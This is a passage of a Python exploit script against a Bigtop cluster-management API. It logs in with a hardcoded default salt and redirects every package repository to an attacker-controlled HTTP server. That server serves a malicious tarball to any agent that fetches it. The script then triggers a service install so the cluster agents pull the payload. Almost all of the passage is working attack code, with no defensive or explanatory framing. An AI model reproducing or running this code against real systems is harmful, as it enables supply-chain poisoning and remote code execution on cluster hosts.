_DEFAULT_SALT = b"k9@2Uw3*Y@Ccno9c"

def build_tarball():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in [("bigtop-pkg/VERSION", b"1.1.0\n"), (EVIL_ENTRY, EVIL_CONTENT)]:
            ti = tarfile.TarInfo(name=name)
            ti.size, ti.mode, ti.mtime = len(data), 0o644, int(time.time())
            tar.addfile(ti, io.BytesIO(data))
    return buf.getvalue()

class PayloadHandler(BaseHTTPRequestHandler):
    tarball = b""
    def do_GET(self):
        print("    [http] agent %s fetched %s -> serving malicious tarball (%d bytes)"
              % (self.client_address[0], self.path, len(self.tarball)))
        self.send_response(200)
        self.send_header("Content-Type", "application/gzip")
        self.send_header("Content-Length", str(len(self.tarball)))
        self.end_headers()
        self.wfile.write(self.tarball)
    def log_message(self, *a):
        pass

def serve(tarball):
    PayloadHandler.tarball = tarball
    httpd = ThreadingHTTPServer(("0.0.0.0", LPORT), PayloadHandler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    print("[+] Payload server: http://%s:%d  (serving %d-byte tarball to any path)" % (LHOST, LPORT, len(tarball)))
    return httpd

def _pbkdf2(data, salt):
    return hashlib.pbkdf2_hmac("sha256", data, salt, 600000, 32).hex()

def login_password(user, pw):
    return _pbkdf2(pw.encode(), _pbkdf2(user.encode(), _DEFAULT_SALT).encode())

def api(method, path, token=None, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BIGTOP + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Token", token)
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())

def exploit():
    nonce = api("GET", "/api/nonce?username=" + urllib.parse.quote(USER)).get("data")
    lr = api("POST", "/api/login", body={"username": USER, "password": login_password(USER, PASSWD), "nonce": nonce})
    token = (lr.get("data") or {}).get("token")
    if not token:
        print("[-] Login failed: %s" % lr); return
    print("[+] Authenticated       : %s  (JWT %s...)" % (USER, token[:20]))

    repos = api("GET", "/api/repos", token=token).get("data") or []
    print("[*] Repos before        : " + ", ".join("%s=%s" % (r.get("id"), r.get("baseUrl")) for r in repos))
    poisoned = [{"id": r.get("id"), "baseUrl": "http://%s:%d/" % (LHOST, LPORT)} for r in repos]
    api("PUT", "/api/repos", token=token, body=poisoned)
    print("[+] Repos poisoned      : baseUrl -> http://%s:%d/" % (LHOST, LPORT))

    if CLUSTER_ID and SERVICE_INSTALL:
        cmd = {"command": "ADD", "clusterId": CLUSTER_ID, "commandLevel": "SERVICE", "serviceCommands": [SERVICE_INSTALL]}
        print("[+] Install triggered   : %s" % api("POST", "/api/command", token=token, body=cmd).get("data"))
    else:
        print("[*] Nope.")

